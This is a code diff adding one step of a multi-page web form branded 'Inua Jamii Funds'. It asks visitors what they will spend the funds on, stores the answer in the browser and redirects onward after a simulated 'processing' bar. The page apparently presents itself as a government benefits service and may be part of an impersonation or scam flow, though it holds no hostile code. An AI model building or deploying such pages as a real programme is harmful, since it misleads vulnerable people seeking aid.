@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>INUA JAMII FUNDS</title>
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&amp;display=swap" rel="stylesheet" />
+<style>
+    @media(max-width: 480px){
+  body {
+    zoom: 0.8; /* Optional: slightly zoom out for small screens */
+  }
+  .card {
+    transform: scale(0.9); /* Scale down the card */
+    transform-origin: top; /* Optional: scale from the top */
+  }
+    }
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    /* Green gradient background with overlay */
+    background: linear-gradient(135deg, #4CAF50, #81C784);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+  }
+
+  /* Optional overlay for darkening background for better contrast */
+  body::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.2);
+    z-index: -1;
+  }
+
+  .card {
+    background: #fff;
+    width: 95%;
+    max-width: 950px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    padding: 40px 30px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .header h1 {
+    font-size: 2em;
+    color: #00695c;
+    margin-bottom: 10px;
+  }
+
+  .header p {
+    font-size: 1.1em;
+    color: #607d8b; /* muted gray-blue heading */
+  }
+
+  /* Kenyan flag graphic (inline SVG, no external image needed) */
+  .flag {
+    display: inline-block;
+    width: 72px;
+    height: 48px;
+    border-radius: 6px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.25);
+    margin-bottom: 14px;
+  }
+
+  /* Options grid */
+  .options-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    margin-bottom: 10px;
+  }
+
+  .option {
+    background: #fff;
+    border: 1px solid #e0e0e0;
+    border-radius: 10px;
+    padding: 20px;
+    cursor: pointer;
+    text-align: left;
+    font-family: 'Raleway', sans-serif;
+    font-size: 1em;
+    font-weight: 700;
+    color: #222;
+    transition: border-color 0.2s, background-color 0.2s, transform 0.15s, box-shadow 0.15s;
+    position: relative;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .option:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+  }
+
+  .option:active {
+    transform: scale(0.98);
+  }
+
+  .option .emoji {
+    font-size: 30px;
+    line-height: 1;
+    flex-shrink: 0;
+  }
+
+  .option .label {
+    font-weight: 700;
+    color: #222;
+  }
+
+  /* Selected (active) state */
+  .option.active {
+    background-color: #fff4e5;       /* light orange tint */
+    border: 2px solid #ff6b00;       /* solid orange border */
+    padding: 19px;                   /* 1px less than default 20px, offsets the +1px border so the card doesn't shift */
+  }
+
+  .option.active::after {
+    content: "✓";
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    width: 20px;
+    height: 20px;
+    background-color: #ff6b00;
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: bold;
+  }
+
+/* Error message style (same as index2) */
+  .error-message {
+    color: #d32f2f;
+    font-size: 0.85em;
+    margin-top: 4px;
+    display: none;
+  }
+
+  .error-message.show {
+    display: block;
+  }
+
+  /* Button styles */
+  button {
+    background-color: #0f9d8c;
+    color: #fff;
+    padding: 16px;
+    border: none;
+    border-radius: 10px;
+    font-size: 1.2em;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.3s, transform 0.2s;
+  }
+
+  button:hover {
+    background-color: #0b8274;
+    transform: translateY(-2px);
+  }
+
+  button:disabled {
+    background-color: #b2dfdb;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  /* Submit button full width */
+  .submit-btn {
+    width: 100%;
+    margin-top: 20px;
+    font-weight: 700;
+  }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    margin-top: 50px;
+    font-size: 1em;
+    color: #fff;
+  }
+
+  /* Responsive grid adjustments */
+  @media(max-width: 768px){
+    .options-grid {
+      grid-template-columns: repeat(2, 1fr);
+    }
+  }
+
+  @media(max-width: 480px){
+    .options-grid {
+      grid-template-columns: 1fr;
+    }
+  }
+
+  /* Modal overlay for processing */
+  #processingOverlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.4);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+
+  #processingBox {
+    background: #fff;
+    padding: 30px;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+    position: relative;
+  }
+
+  #processingBox h3 {
+    margin-bottom: 20px;
+    color: #00695c;
+  }
+
+  .loader {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #009688;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    margin: 20px auto;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg);}
+    100% { transform: rotate(360deg);}
+  }
+
+  /* Progress bar inside modal */
+  #progressBarContainer {
+    width: 100%;
+    background-color: #eee;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-top: 20px;
+  }
+
+  #progressBar {
+    height: 8px;
+    width: 0%;
+    background-color: #009688;
+    transition: width 0.4s;
+  }
+
+  /* Success message styling */
+  #successMessage {
+    display: none;
+    margin-top: 20px;
+    font-size: 1.2em;
+    color: #2e7d32;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <svg class="flag" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Kenyan flag">
+      <!-- Black top stripe -->
+      <rect width="300" height="66" fill="#000000"/>
+      <!-- White fimbriation -->
+      <rect y="66" width="300" height="5" fill="#FFFFFF"/>
+      <!-- Red center stripe -->
+      <rect y="71" width="300" height="58" fill="#BB0000"/>
+      <!-- White fimbriation -->
+      <rect y="129" width="300" height="5" fill="#FFFFFF"/>
+      <!-- Green bottom stripe -->
+      <rect y="134" width="300" height="66" fill="#006600"/>
+      <!-- Crossed white spears behind the shield -->
+      <line x1="120" y1="74" x2="180" y2="126" stroke="#FFFFFF" stroke-width="4" stroke-linecap="round"/>
+      <line x1="180" y1="74" x2="120" y2="126" stroke="#FFFFFF" stroke-width="4" stroke-linecap="round"/>
+      <polygon points="118,70 127,72 122,79" fill="#FFFFFF"/>
+      <polygon points="182,70 173,72 178,79" fill="#FFFFFF"/>
+      <!-- Maasai shield -->
+      <path d="M 150 78 C 159 75 168 82 168 96 C 168 104 166 113 163 120 C 160 127 155 133 150 136 C 145 133 140 127 137 120 C 134 113 132 104 132 96 C 132 82 141 75 150 78 Z" fill="#FFFFFF" stroke="#000000" stroke-width="2"/>
+      <!-- Black upper section of the shield -->
+      <path d="M 134 92 L 166 92 L 166 100 L 150 106 L 134 100 Z" fill="#000000"/>
+      <!-- Red lower section of the shield -->
+      <path d="M 150 106 L 166 100 L 164 113 C 161 121 156 128 150 132 C 144 128 139 121 136 113 L 134 100 Z" fill="#BB0000"/>
+      <!-- White notch in the red section -->
+      <path d="M 147 100 L 153 100 L 152 112 L 150 114 L 148 112 Z" fill="#FFFFFF"/>
+    </svg>
+    <h1>What Would You Like to Use the Inua Jamii Funds For?</h1>
+    <p>Select the option that best describes your purpose</p>
+  </div>
+
+  <form id="purposeForm" novalidate>
+    <!-- Options grid -->
+    <div class="options-grid" id="optionsGrid">
+      <button type="button" class="option" data-value="Food">
+        <span class="emoji">🍲</span>
+        <span class="label">Food</span>
+      </button>
+      <button type="button" class="option" data-value="Business">
+        <span class="emoji">🏢</span>
+        <span class="label">Business</span>
+      </button>
+      <button type="button" class="option" data-value="School Fees">
+        <span class="emoji">🎓</span>
+        <span class="label">School Fees</span>
+      </button>
+      <button type="button" class="option" data-value="Rent">
+        <span class="emoji">🏠</span>
+        <span class="label">Rent</span>
+      </button>
+      <button type="button" class="option" data-value="Medical">
+        <span class="emoji">💊</span>
+        <span class="label">Medical</span>
+      </button>
+      <button type="button" class="option" data-value="Clothing">
+        <span class="emoji">👗</span>
+        <span class="label">Clothing</span>
+      </button>
+    </div>
+
+    <!-- Error message -->
+    <div class="error-message" id="error-option">Please select an option first.</div>
+
+    <!-- Submit Button -->
+    <button type="submit" class="submit-btn">
+      <span>🚀 Submit Your Choice</span>
+    </button>
+
+    <!-- Success Message -->
+    <div id="successMessage">Thank you! Redirecting...</div>
+
+    <!-- Footer -->
+    <div class="footer">
+      🇰🇪 INUA JAMII FUNDS - Transforming Lives 🇰🇪
+    </div>
+  </form>
+</div>
+
+<!-- Processing Overlay -->
+<div id="processingOverlay">
+  <div id="processingBox">
+    <div class="loader"></div>
+    <h3>Processing Your Choice...</h3>
+    <div id="progressBarContainer">
+      <div id="progressBar"></div>
+    </div>
+    <p>Please wait while we save your selection. This may take a few seconds.</p>
+  </div>
+</div>
+<script>
+(function() {
+  // Options
+  const options = document.querySelectorAll('.option');
+  const errorEl = document.getElementById('error-option');
+  const successMsg = document.getElementById('successMessage');
+  const overlay = document.getElementById('processingOverlay');
+  const progressBar = document.getElementById('progressBar');
+
+  let selectedValue = '';
+
+  // On page load, pre-select the saved purpose if it exists
+  const savedData = localStorage.getItem('nyota_finalData');
+  if (savedData) {
+    try {
+      const data = JSON.parse(savedData);
+      if (data && data.purpose) {
+        selectOption(data.purpose);
+      }
+    } catch(e) {
+      // ignore parsing errors
+    }
+  }
+
+  function selectOption(value) {
+    options.forEach(opt => {
+      if (opt.dataset.value === value) {
+        opt.classList.add('active');
+      } else {
+        opt.classList.remove('active');
+      }
+    });
+    selectedValue = value;
+    errorEl.className = 'error-message'; // hide error once a choice is made
+  }
+
+  // Click handler: single-select; re-clicking the active option deselects it
+  options.forEach(opt => {
+    opt.addEventListener('click', () => {
+      if (opt.classList.contains('active')) {
+        opt.classList.remove('active');
+        selectedValue = '';
+      } else {
+        selectOption(opt.dataset.value);
+      }
+    });
+  });
+
+  // Submit handler
+  document.getElementById('purposeForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    if (!selectedValue) {
+      errorEl.className = 'error-message show';
+      return;
+    }
+
+    // Show processing overlay
+    overlay.style.display = 'flex';
+
+    // Animate progress bar, then save and redirect
+    let stepIndex = 0;
+    const progressSteps = [30, 60, 90, 100];
+
+    const progressInterval = setInterval(() => {
+      if (stepIndex >= progressSteps.length) {
+        clearInterval(progressInterval);
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          successMsg.style.display = 'block';
+
+          // Merge with existing saved data
+          let dataToSave = {};
+          try {
+            const existing = localStorage.getItem('nyota_finalData');
+            if (existing) {
+              dataToSave = JSON.parse(existing);
+            }
+          } catch(e) {
+            // ignore parsing errors, start fresh
+          }
+          dataToSave.purpose = selectedValue;
+          dataToSave.timestamp = new Date().toISOString();
+          localStorage.setItem('nyota_finalData', JSON.stringify(dataToSave));
+
+          // Redirect after 2 seconds
+          setTimeout(() => {
+            window.location.href = 'index4.html';
+          }, 2000);
+        }, 600);
+        return;
+      }
+      progressBar.style.width = progressSteps[stepIndex] + '%';
+      stepIndex++;
+    }, 600);
+  });
+})();
+</script>
+
+</body>
+
+
+</html>
